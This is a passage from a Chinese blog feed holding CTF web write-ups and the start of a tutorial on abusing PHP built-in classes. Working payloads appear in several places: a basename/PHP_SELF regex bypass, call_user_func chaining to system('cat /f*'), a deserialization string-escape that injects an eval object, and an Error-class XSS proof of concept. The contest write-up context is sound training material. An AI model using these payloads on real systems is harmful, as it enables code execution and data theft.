class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题思路跟上题一样</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/flag.php/卧槽?sou[rc.e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SERVER参数和basename函数绕过&quot;&gt;&lt;a href=&quot;#SERVER参数和basename函数绕过&quot; class=&quot;headerlink&quot; title=&quot;$_SERVER参数和basename函数绕过&quot;&gt;&lt;/a&gt;$_SERVER参数和basename函数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>琢光杯新生赛wp(web)</title>
    <link href="http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/"/>
    <id>http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/</id>
    <published>2023-12-15T11:42:17.000Z</published>
    <updated>2023-12-15T11:43:25.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="天命之子"><a href="#天命之子" class="headerlink" title="天命之子"></a>天命之子</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ &quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sou_rc.e&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <br>    <br>    <br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$ars</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$sec</span>=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sec</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ars</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>basename+正则绕过</p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$s</span>))&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(i));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php/flag.php/<span class="hljs-title function_">%ff</span>?sou[rc.e<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190234449.png" alt="image-20231215190234449"></p><h1 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-variable">$parameters</span> = <span class="hljs-variable">$_GET</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>]);<br>&#125;<br><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$parameters</span>)(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>current会输出数组当前元素值</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">action</span>=current&amp;a=current<br>POST:<br>a[]=system&amp;<span class="hljs-attribute">b</span>=cat /f*<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190559981.png" alt="image-20231215190559981"></p><h1 id="serialize-escape"><a href="#serialize-escape" class="headerlink" title="serialize_escape"></a>serialize_escape</h1><p>提示<a href="http://www.zip有好东西/">www.zip有好东西</a></p><p>下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// Thinking how to use sing?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jump</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pwd</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$root</span>, <span class="hljs-variable">$pwd</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;root = <span class="hljs-variable">$root</span>;<br><span class="hljs-variable language_">$this</span>-&gt;pwd = <span class="hljs-variable">$pwd</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;root);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;pwd);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hehe!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sw</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ikun&#x27;</span>, <span class="hljs-string">&#x27;kk&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125; <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;B&#x27;</span>];<br>    <span class="hljs-variable">$rap</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">jump</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$baskerball</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$rap</span>);<br>    <span class="hljs-variable">$success</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">sw</span>(<span class="hljs-variable">$baskerball</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$success</span>;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计：</p><p>我们最终要利用eval命令执行</p><p>ikun会被替换成kk，也就是说每四个字符会逃逸两个</p><p>而我们需要逃逸  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-built_in">pwd</span><span class="hljs-string">&quot;;s:xx:&quot;</span><br></code></pre></td></tr></table></figure><p>需要18&#x2F;2个ikun</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x=<span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sing</span>(<span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">seeeeer.php?A=ikunikunikunikunikunikunikunikunikun&amp;B=<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">pwd</span><span class="hljs-string">&quot;;O:4:&quot;</span>sing<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>x<span class="hljs-string">&quot;;s:18:&quot;</span><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215191845070.png" alt="image-20231215191845070"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;天命之子&quot;&gt;&lt;a href=&quot;#天命之子&quot; class=&quot;headerlink&quot; title=&quot;天命之子&quot;&gt;&lt;/a&gt;天命之子&lt;/h1&gt;&lt;p&gt;打开环境&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php原生类</title>
    <link href="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-12-15T09:24:45.000Z</published>
    <updated>2023-12-15T09:27:05.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>Directorylterator</li><li>SimpleXMLElement</li></ul><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h1><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><ul><li>适用于php7</li><li>开启报错</li></ul><h3 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h3><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br> <br></code></pre></td></tr></table></figure><p><strong>类属性</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><h3 id="使用Error内置类来构造xss"><a href="#使用Error内置类来构造xss" class="headerlink" title="使用Error内置类来构造xss"></a>使用Error内置类来构造xss</h3><p>Error类是php的一个内置类，用于自定义一个Error。由于它内置的__toString()方法，在php7下可能造成xss，常用于反序列化中。</p><p>当php对象被当作字符串输出时，会触发__toString方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153028854.png" alt="image-20231215153028854"></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul><li>适用于php5、7</li><li>开启报错</li></ul><h3 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h3><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类属性</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a 